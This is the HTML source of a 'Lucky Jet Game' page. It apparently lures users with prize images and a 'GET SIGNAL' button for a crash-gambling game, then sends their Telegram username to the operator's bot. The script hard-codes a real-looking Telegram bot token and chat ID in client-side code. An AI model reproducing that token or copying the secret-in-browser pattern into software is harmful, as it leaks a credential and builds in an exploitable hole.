<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lucky Jet Game</title>
    <!-- Include Bootstrap CSS -->
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <!-- Include Lilita One Font -->
    <link href="https://fonts.googleapis.com/css2?family=Lilita+One&display=swap" rel="stylesheet">
    <!-- Include Roboto Condensed Font -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@700&display=swap" rel="stylesheet">
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #090F1E;
            color: #FFF;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }

        .screen {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            opacity: 0;
            transition: opacity 0.5s ease;
            flex-direction: column;
        }

        .screen.active {
            opacity: 1;
            z-index: 1;
        }

        #luckyJetScreen {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: relative;
        }

        .card-container {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .card {
            background-color: #1C232A;
            color: #000;
            text-align: center;
            width: 80vw;
            max-width: 18rem;
        }

        .image-container {
            position: relative;
            height: 286px;
            background-color: #1C232A;
            width: 100%;
            overflow: hidden; /* Ensure that the image does not overflow */
        }

        /* Adjusting carousel styles */
        .carousel-inner img {
            width: 100%;
            height: 100%;
            object-fit: contain; /* Maintain aspect ratio */
        }

        .card-body {
            padding: 0 1rem 1rem 1rem;
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            align-items: stretch;
        }

        .card-body-top {
            background-color: #1C232A;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0.5rem 1rem;
            border-bottom: 1px solid #333;
        }

        .card-body-top h5 {
            font-size: 1rem;
            color: #FFF;
            margin: 0;
            font-family: 'Roboto Condensed', sans-serif;
            font-weight: bold;
            display: flex;
        }

        #titleLucky {
            color: #4ef5ce;
        }

        #titleJet {
            color: #FFFFFF;
        }

        .full-width-button {
            width: 100%;
            height: 100%;
            display: block;
            font-size: 1.25rem;
            text-align: center;
            border-radius: 0 0 0.25rem 0.25rem;
            margin: 0;
            background-color: #00C45D;
            color: white;
            font-family: 'Roboto Condensed', sans-serif;
            font-weight: bold;
            margin-bottom: 1rem;
        }

        .full-width-button:hover {
            background-color: #1C7ED6;
        }

        .full-width-button:active {
            background-color: #1864AB;
        }

        .input-field {
            width: 100%;
            padding: 0.5rem;
            margin-bottom: 1rem;
            border-radius: 5px;
            border: 1px solid #ccc;
        }

        .register-button {
            width: 100%;
            padding: 0.75rem;
            font-size: 1rem;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            font-family: 'Roboto Condensed', sans-serif;
            font-weight: bold;
            cursor: pointer;
        }

        .register-button:hover {
            background-color: #0056b3;
        }

        .back-button {
            margin-top: 3vh;
            padding: 1vh 3vw;
            font-size: 2.5vw;
            border-radius: 20px;
            width: 50vw;
            max-width: 150px;
        }

        @media (min-width: 768px) {
            .back-button {
                font-size: 16px;
                width: 150px;
            }
        }

        .close {
            color: #FFF;
            font-size: 1.5rem;
        }

        .close:hover {
            color: #CCC;
        }

        /* Notification styles */
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background-color: #28a745;
            color: white;
            padding: 10px;
            border-radius: 5px;
            display: none;
            z-index: 1000;
        }

        .notification.error {
            background-color: #dc3545;
        }
    </style>
</head>

<body>
    <!-- Lucky Jet Screen -->
    <div id="luckyJetScreen" class="screen active">
        <div class="card-container">
            <div class="card">
                <!-- Top Card Body -->
                <div class="card-body-top">
                    <h5>
                        <span id="titleLucky">PRIZES</span>
                    </h5>
                    <button type="button" class="close" aria-label="Close" onclick="window.location.href='Home.html'">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>

                <!-- Image Container with Carousel -->
                <div id="carouselExampleIndicators" class="carousel slide image-container" data-ride="carousel">
                    <ol class="carousel-indicators">
                        <li data-target="#carouselExampleIndicators" data-slide-to="0" class="active"></li>
                        <li data-target="#carouselExampleIndicators" data-slide-to="1"></li>
                        <li data-target="#carouselExampleIndicators" data-slide-to="2"></li>
                        <li data-target="#carouselExampleIndicators" data-slide-to="3"></li>
                    </ol>
                    <p>Telegram Username:</p>
                    <div class="carousel-inner">
                        <div class="carousel-item active">
                            <img src="Resources/Home SlideShow/Airpods.png" class="d-block w-100" alt="Airpods">
                        </div>
                        <div class="carousel-item">
                            <img src="Resources/Home SlideShow/airpods-max.png" class="d-block w-100" alt="Airpods Max">
                        </div>
                        <div class="carousel-item">
                            <img src="Resources/Home SlideShow/BMW 320i.png" class="d-block w-100" alt="BMW 320i">
                        </div>
                        <div class="carousel-item">
                            <img src="Resources/Home SlideShow/iPhone 15 Pro Max.png" class="d-block w-100" alt="iPhone 15 Pro Max">
                        </div>
                    </div>
                    <p>Telegram Username:</p>
                    <a class="carousel-control-prev" href="#carouselExampleIndicators" role="button" data-slide="prev">
                        <span class="carousel-control-prev-icon" aria-hidden="true"></span>
                        <span class="sr-only">Previous</span>
                    </a>
                    <a class="carousel-control-next" href="#carouselExampleIndicators" role="button" data-slide="next">
                        <span class="carousel-control-next-icon" aria-hidden="true"></span>
                        <span class="sr-only">Next</span>
                    </a>
                </div>

                <!-- Bottom Card Body -->
                <div class="card-body">
                    <button class="btn full-width-button" id="getSignalButton" onclick="luckyJetGetSignal()">GET SIGNAL</button>
                    <p>Telegram Username:</p>
                    <input type="text" id="telegramUsername" class="input-field" placeholder="Enter your Telegram username">
                    <button class="register-button" onclick="sendMessage()">Înregistrează-mă</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Notification Popup -->
    <div id="notification" class="notification"></div>

    <!-- Include jQuery and Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.2/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

    <script>
        function showNotification(message, isError = false) {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.className = isError ? 'notification error' : 'notification';
            notification.style.display = 'block';

            setTimeout(() => {
                notification.style.display = 'none';
            }, 2000);
        }

        function sendMessage() {
            const telegramUsername = document.getElementById('telegramUsername').value.trim();
            if (!telegramUsername) {
                showNotification('Username field cannot be empty.', true);
                return;
            }

            const chatId = '6953089880';
            const botToken = '7239110595:AAEH1ka6DJM6NZtsJM41RcxFK5PPaWQh6FU';
            const message = encodeURIComponent(telegramUsername);
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        showNotification('Message sent successfully!');
                    } else {
                        showNotification('Error sending message.', true);
                    }
                })
                .catch(error => {
                    showNotification('An error occurred: ' + error.message, true);
                });
        }
    </script>
</body>

</html>
